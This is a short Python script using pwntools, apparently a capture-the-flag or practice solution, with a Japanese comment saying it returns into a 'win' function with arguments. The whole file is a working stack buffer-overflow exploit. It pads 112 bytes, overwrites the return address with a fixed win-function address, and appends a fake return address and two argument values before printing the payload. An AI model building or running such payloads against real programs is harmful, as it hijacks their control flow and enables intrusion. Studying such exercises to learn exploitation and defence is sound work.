# coding: utf-8

# 引数付きでwin関数にリターンする

from pwn import *

win_addr = 0x080485cb

payload = "A" * 112
payload += p32(win_addr)
payload += "B" * 4
payload += p32(0xdeadbeef)
payload += p32(0xdeadc0de)

print(payload)
